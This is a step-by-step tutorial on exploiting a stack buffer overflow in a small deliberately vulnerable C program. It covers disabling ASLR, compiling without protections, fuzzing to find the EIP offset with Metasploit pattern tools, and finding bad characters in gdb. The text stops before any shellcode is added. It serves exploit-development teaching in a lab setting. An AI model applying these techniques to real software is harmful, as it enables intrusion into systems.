# Steps to exploit Buffer Overflow Vulnerability
**Program that will be exploited**
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int bowfunc(char *string)
{
    char buffer[1024];
    strcpy(buffer,string);
    return 1;
}
int main(int argc, char *argv[])
{
    bowfunc(argv[1]);
    return 0;
}
```
**Note**: I am using Kali Linux 32 bit as Operating System.


#### Step # 1: Disable ASLR Protection
For Linux Enter command: ```echo 0 | sudo tee /proc/sys/kernel/randomize_va_space```

#### Step # 2: Compile the vulnerable code using gcc using following command: 
```gcc -g -o exploit exploit.c -fno-stack-protector -z execstack```

#### Step # 3: We will now debug the code using gdb (Linux GNU Debugger)
``gdb ./exploit -q``

**Note**: To Set the intel disassembly point in gdb ``set disassembly-flavor intel``

#### Step # 4: Generate the fuzzy payload of length 1050, so that we can identify at which point buffer will be overflowed.
```/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1050```

#### Step # 5: Pass the random string to the vulnerable program and note the address where the program crashed. Interact with gdb terminal and paste the following:
```run "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9"```

#### Step # 6: Identify the actual bytes to overwrite the Instruction Pointer. You may see the following output in gdb terminal after pasting above payload.
```
Program received signal SIGSEGV, Segmentation fault.0x69423569 in ?? ()
```
Now we need to identify the actual bytes to fill the buffer or to reach the Instruction Pointer. So, achieve it as follows:
```/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569```

Output may be like: ```[*] Exact match at offset 1036```

#### Step # 7: Identify the bad characters. For it, you will need to include all possible 256 bad characters in the payload and identify whether they are being vanished or not. If the character is being vanished or being replaced with null bytes(00) then it means the character is bad and we will avoid this character from shell code. 

    - Total bytes to reach till EIP:1036
    - The initial payload for now would be:``run $(python -c 'print "A"*1036'+"BBBB")``. Then you will see that EIP would be overwritten with 0x42424242 (ascii values of ``B``)
    - Total bytes of possible bad character:256
    - 1036-256=780
    - As we will need to detect the bad characters so we will need to pass the possible 256 characters with the payload as below:

        ```
        run $(python -c 'print "A"*780+"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"')
        ```
        - Now set the breakpoint at line # 9 (return 1) and use the command to see that stack from gdb.``x/300bx $esp``
        - It will show you the 300 bytes starting from Extended Stack Pointer. Probably, you will see the output like following:
        ```
        0xbfffed40:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffed48:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffed50:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffed58:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffed60:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffed68:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffed70:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffed78:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffed80:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffed88:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffed90:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffed98:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffeda0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffeda8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffedb0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffedb8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffedc0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffedc8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffedd0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffedd8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffede0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffede8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffedf0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffedf8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffee00:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffee08:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffee10:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffee18:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffee20:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffee28:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffee30:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffee38:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffee40:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffee48:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffee50:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffee58:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffee60:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
        0xbfffee68:	0x41	0x41	0x41	0x41
        ```
        - Now use this command: ``x/300bx $esp+750`` (it will show you the 300 bytes starting from the stack pointer + 750 bytes address) as following:
            ```
            0xbffff02e:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
            0xbffff036:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
            0xbffff03e:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
            0xbffff046:	0x41	0x41	0x41	0x41	0x41	0x41	0x00	0x00
            0xbffff04e:	0x00	0x00	0xe8	0xfe	0xdd	0xb7	0x60	0x09
            0xbffff056:	0x00	0x00	0x78	0x07	0xde	0xb7	0x10	0xc1
            0xbffff05e:	0xfc	0xb7	0xb4	0xf0	0xff	0xbf	0xb0	0xf0
            ...
            ...
            ...
            ```
        - You can see from above output that at address 0xbffff046 after 0x41 there is no 0x01 after the 0x00. It means that 0x00 is creating issues and is known as bad character, so we will remove it from our payload and then re-execute the payload and re-analyze such characters which are creating issues. Remove such bad characters from payload and mention them aside. After completely analyzing the characters that were identified as bad in my case were: ``\x00\x0a\x09\x20``

